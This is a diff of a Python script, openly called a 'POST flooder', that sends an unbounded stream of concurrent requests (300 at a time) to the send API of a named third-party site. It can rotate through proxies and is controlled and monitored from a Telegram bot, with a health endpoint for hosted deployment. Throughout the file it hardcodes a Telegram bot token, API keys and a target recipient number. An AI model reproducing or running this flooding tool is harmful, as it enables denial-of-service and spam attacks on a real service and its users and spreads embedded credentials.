@@ -1,24 +1,32 @@
 #!/usr/bin/env python3
 """
-Telegram‑controlled flooder for txg‑gateway.xyz – ready for Railway.
+Stable POST flooder for txg-gateway.xyz with Telegram bot control.
+Uses two API keys via POST requests.
 """
 import asyncio
-import os
+import aiohttp
+import json
+import random
 import time
-from itertools import cycle
+import signal
+import sys
+import logging
+import os
+from aiohttp import web
 
-from aiohttp import web, ClientSession, TCPConnector
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
-# ─── Configuration ─────────────────────────────────────
-URL = "https://txg-gateway.xyz/client/api/send.php"
+# ─── LOGGING ──────────────────────────────────────────────
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# Bot token & owner – you can override with env vars
+# ─── TELEGRAM CONFIG (env overrides) ────────────────────
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8822885362:AAFqWv1vAniTnKwuSKI0FwO7mBIuBq3qOw8")
-OWNER_ID = int(os.getenv("OWNER_ID", "8401097557"))
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8401097557"))
 
-# Two API configs (you can add more)
+# ─── ATTACK CONFIG ──────────────────────────────────────
+# Two API configurations (POST payloads)
 CONFIGS = [
     {
         "api_key": "86864a72c5e2f3ad32c1c8f52710959f",
@@ -31,6 +39,8 @@ CONFIGS = [
         "toUser": "9359202967",
     },
 ]
+
+URL = "https://txg-gateway.xyz/client/api/send.php"
 
 BASE_HEADERS = {
     "Host": "txg-gateway.xyz",
@@ -46,30 +56,35 @@ BASE_HEADERS = {
     "sec-fetch-mode": "cors",
     "sec-fetch-dest": "empty",
     "Referer": "https://txg-gateway.xyz/dashboard/send.php",
-    "Accept-Encoding": "gzip, deflate",      # no br
+    "Accept-Encoding": "gzip, deflate",
     "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
     "Priority": "u=1, i",
 }
 
-# ─── Global state ─────────────────────────────────────
-flood_task = None
-stop_flood = False
-current_stats = {
-    "total": 0,
-    "done": 0,
-    "success": 0,
-    "errors": 0,
-    "start_time": None,
-    "running": False,
-    "concurrency": 0,
-}
+# ─── PERFORMANCE SETTINGS ──────────────────────────────
+CONCURRENT = 300               # parallel requests
+TOTAL_REQUESTS = 0             # 0 = infinite
+USE_PROXIES = False
+PROXY_FILE = "proxies.txt"
 
-# ─── Send one request ─────────────────────────────────
-async def send_one(session, config, semaphore):
-    global current_stats
-    if stop_flood:
-        return None
-    async with semaphore:
+# ─── GLOBAL STATS ──────────────────────────────────────
+stats = {'sent': 0, 'ok': 0, 'fail': 0}
+lock = asyncio.Lock()
+start_time = time.time()
+flooder_running = True
+flooder_task_obj = None
+
+# ─── PROXY LOADER (optional) ───────────────────────────
+def load_proxies():
+    try:
+        with open(PROXY_FILE) as f:
+            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
+    except FileNotFoundError:
+        return []
+
+# ─── ASYNC REQUEST WORKER ──────────────────────────────
+async def fire(session, sem, config, proxy=None):
+    async with sem:
         headers = {**BASE_HEADERS, "Cookie": config["cookie"]}
         payload = {
             "toUser": config["toUser"],
@@ -81,180 +96,177 @@ async def send_one(session, config, semaphore):
             "manual": False,
         }
         try:
-            async with session.post(URL, json=payload, headers=headers, timeout=5) as resp:
+            async with session.post(URL, json=payload, headers=headers, proxy=proxy, ssl=False, timeout=5) as resp:
+                status = resp.status
+                # read response to avoid warnings
                 await resp.text()
-                if resp.status == 200:
-                    current_stats["success"] += 1
+            async with lock:
+                stats['sent'] += 1
+                if 200 <= status < 400:
+                    stats['ok'] += 1
                 else:
-                    current_stats["errors"] += 1
-                return resp.status
+                    stats['fail'] += 1
         except Exception:
-            current_stats["errors"] += 1
-            return None
+            async with lock:
+                stats['sent'] += 1
+                stats['fail'] += 1
 
-# ─── Flood runner ──────────────────────────────────────
-async def run_flood(total, concurrency):
-    global flood_task, stop_flood, current_stats
-    stop_flood = False
-    current_stats.update({
-        "total": total,
-        "done": 0,
-        "success": 0,
-        "errors": 0,
-        "start_time": time.time(),
-        "running": True,
-        "concurrency": concurrency,
-    })
+# ─── MAIN FLOODER LOOP ──────────────────────────────────
+async def flooder_loop():
+    global flooder_running
+    proxies = load_proxies() if USE_PROXIES else []
+    sem = asyncio.Semaphore(CONCURRENT)
+    connector = aiohttp.TCPConnector(limit=CONCURRENT * 2, limit_per_host=CONCURRENT, force_close=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = set()
+        count = 0
+        logger.info("Flooder started, sending POST requests...")
+        while flooder_running and (TOTAL_REQUESTS == 0 or count < TOTAL_REQUESTS):
+            config = random.choice(CONFIGS)
+            proxy = random.choice(proxies) if proxies else None
+            task = asyncio.create_task(fire(session, sem, config, proxy))
+            tasks.add(task)
+            count += 1
 
-    connector = TCPConnector(ssl=False, limit=0)
-    semaphore = asyncio.Semaphore(concurrency)
-    config_cycle = cycle(CONFIGS)
+            # Limit task accumulation to avoid memory leak
+            if len(tasks) > CONCURRENT * 2:
+                done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
+                tasks = set(tasks)
 
-    async with ClientSession(connector=connector) as session:
-        tasks = []
-        for i in range(total):
-            if stop_flood:
-                break
-            config = next(config_cycle)
-            tasks.append(send_one(session, config, semaphore))
-            if i % 100 == 0:
-                await asyncio.sleep(0)
+            # Yield control to event loop
+            await asyncio.sleep(0)
 
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        current_stats["done"] = len(results)
-        current_stats["running"] = False
+        # Wait for remaining tasks
+        if tasks:
+            await asyncio.wait(tasks, timeout=10)
+        logger.info("Flooder stopped.")
 
-        # Final report to owner
-        elapsed = time.time() - current_stats["start_time"]
-        msg = (f"🏁 Flood finished!\n"
-               f"Total: {current_stats['total']}\n"
-               f"Done: {current_stats['done']}\n"
-               f"Success (200): {current_stats['success']}\n"
-               f"Errors: {current_stats['errors']}\n"
-               f"Time: {elapsed:.2f}s\n"
-               f"Rate: {current_stats['done']/elapsed:.1f} req/s")
-        await bot_app.bot.send_message(chat_id=OWNER_ID, text=msg)
-
-# ─── Telegram Handlers ────────────────────────────────
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("Unauthorized.")
+# ─── TELEGRAM BOT COMMANDS ──────────────────────────────
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("⛔ Unauthorized.")
         return
     await update.message.reply_text(
-        "🤖 Flood Bot\n"
+        "✅ Flooder is active.\n"
         "Commands:\n"
-        "/start_flood <total> <concurrency> – start flood\n"
-        "/stop – stop current flood\n"
-        "/status – show current status\n"
-        "/help – show this"
+        "/status – show live stats\n"
+        "/stop – stop the flood\n"
+        "/startflood – restart flood (resets stats)"
     )
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("Unauthorized.")
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
         return
-    await update.message.reply_text(
-        "/start_flood <total> <concurrency>\n"
-        "/stop\n"
-        "/status"
-    )
-
-async def start_flood(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global flood_task, current_stats
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("Unauthorized.")
-        return
-    args = context.args
-    if len(args) < 2:
-        await update.message.reply_text("Usage: /start_flood <total> <concurrency>")
-        return
-    try:
-        total = int(args[0])
-        concurrency = int(args[1])
-    except ValueError:
-        await update.message.reply_text("Invalid numbers.")
-        return
-
-    if current_stats["running"]:
-        await update.message.reply_text("A flood is already running. Use /stop first.")
-        return
-
-    await update.message.reply_text(f"Starting flood: {total} requests, concurrency {concurrency}")
-    flood_task = asyncio.create_task(run_flood(total, concurrency))
-
-async def stop_flood_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global stop_flood, current_stats
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("Unauthorized.")
-        return
-    if not current_stats["running"]:
-        await update.message.reply_text("No flood is running.")
-        return
-    stop_flood = True
-    await update.message.reply_text("Stopping flood... (may take a moment)")
-
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("Unauthorized.")
-        return
-    stats = current_stats
-    if not stats["running"]:
-        await update.message.reply_text("No flood running.")
-        return
-    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
-    msg = (f"📊 Status:\n"
-           f"Total: {stats['total']}\n"
-           f"Done: {stats['done']}\n"
-           f"Success: {stats['success']}\n"
-           f"Errors: {stats['errors']}\n"
-           f"Concurrency: {stats['concurrency']}\n"
-           f"Elapsed: {elapsed:.1f}s\n"
-           f"Rate: {stats['done']/elapsed:.1f} req/s" if elapsed > 0 else "Rate: N/A")
+    elapsed = time.time() - start_time
+    rate = stats['sent'] / elapsed if elapsed > 0 else 0
+    msg = (f"📊 **Live Stats**\n"
+           f"📤 Sent: {stats['sent']}\n"
+           f"✅ OK: {stats['ok']}\n"
+           f"❌ Errors: {stats['fail']}\n"
+           f"⏱️ Uptime: {int(elapsed)}s\n"
+           f"⚡ Avg Rate: {rate:.1f} req/s\n"
+           f"🔄 Running: {'Yes' if flooder_running else 'No'}")
     await update.message.reply_text(msg)
 
-# ─── Web server ──────────────────────────────────────
-async def health(request):
-    return web.Response(text="Flooder is running")
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global flooder_running
+    if update.effective_user.id != ADMIN_ID:
+        return
+    if not flooder_running:
+        await update.message.reply_text("⚠️ Already stopped.")
+        return
+    flooder_running = False
+    await update.message.reply_text("🛑 Stopping flooder gracefully...")
 
-async def init_app():
+async def start_flooder(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global flooder_running, start_time, flooder_task_obj, stats
+    if update.effective_user.id != ADMIN_ID:
+        return
+    if flooder_running:
+        await update.message.reply_text("⚠️ Already running.")
+        return
+    flooder_running = True
+    start_time = time.time()
+    stats['sent'] = 0
+    stats['ok'] = 0
+    stats['fail'] = 0
+    flooder_task_obj = asyncio.create_task(flooder_loop())
+    await update.message.reply_text("▶️ Flooder started.")
+
+# ─── PERIODIC AUTO‑REPORT ──────────────────────────────
+async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
+    if not flooder_running:
+        return
+    elapsed = time.time() - start_time
+    rate = stats['sent'] / elapsed if elapsed > 0 else 0
+    msg = (f"📊 **Auto Report**\n"
+           f"📤 Sent: {stats['sent']}\n"
+           f"✅ OK: {stats['ok']}\n"
+           f"❌ Errors: {stats['fail']}\n"
+           f"⚡ Rate: {rate:.1f} req/s")
+    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
+
+# ─── HEALTH CHECK WEB SERVER (for Railway) ─────────────
+async def health(request):
+    return web.Response(text="Flooder is online", status=200)
+
+async def run_webserver():
     app = web.Application()
     app.router.add_get('/', health)
-    return app
-
-# ─── Main ──────────────────────────────────────────────
-async def main():
-    # Start web server
-    port = int(os.getenv("PORT", "8080"))
-    web_app = await init_app()
-    runner = web.AppRunner(web_app)
+    runner = web.AppRunner(app)
     await runner.setup()
-    site = web.TCPSite(runner, host='0.0.0.0', port=port)
+    site = web.TCPSite(runner, host='0.0.0.0', port=int(os.getenv("PORT", "8080")))
+    await site.start()
+    logger.info("Web server started on port %s", os.getenv("PORT", "8080"))
+    # Keep the server running
+    await asyncio.Event().wait()
 
-    # Start bot
-    global bot_app
-    bot_app = Application.builder().token(BOT_TOKEN).build()
-    bot_app.add_handler(CommandHandler("start", start))
-    bot_app.add_handler(CommandHandler("help", help_command))
-    bot_app.add_handler(CommandHandler("start_flood", start_flood))
-    bot_app.add_handler(CommandHandler("stop", stop_flood_cmd))
-    bot_app.add_handler(CommandHandler("status", status))
+# ─── MAIN ──────────────────────────────────────────────────
+async def main():
+    global flooder_task_obj
+    # Start flooder
+    flooder_task_obj = asyncio.create_task(flooder_loop())
 
-    await asyncio.gather(
-        site.start(),
-        bot_app.initialize(),
-        bot_app.start(),
-        bot_app.updater.start_polling()
-    )
+    # Start Telegram bot
+    app = Application.builder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start_command))
+    app.add_handler(CommandHandler("status", status_command))
+    app.add_handler(CommandHandler("stop", stop_command))
+    app.add_handler(CommandHandler("startflood", start_flooder))
 
-    # Keep running
+    job_queue = app.job_queue
+    if job_queue:
+        job_queue.run_repeating(send_periodic_report, interval=30, first=10)
+
+    # Send startup notification
+    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – using POST API.\n/status for stats, /stop to halt.")
+
+    # Start bot polling and web server concurrently
+    await app.initialize()
+    await app.start()
+    await app.updater.start_polling()
+
+    # Run web server alongside
     try:
-        await asyncio.Event().wait()
-    except KeyboardInterrupt:
+        await asyncio.gather(
+            run_webserver(),
+            asyncio.Event().wait()  # keep main alive
+        )
+    except asyncio.CancelledError:
         pass
     finally:
-        await bot_app.updater.stop()
-        await bot_app.stop()
-        await runner.cleanup()
+        await app.updater.stop()
+        await app.stop()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    def signal_handler(sig, frame):
+        global flooder_running
+        logger.info("Shutting down...")
+        flooder_running = False
+        sys.exit(0)
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        logger.info("Exiting.")
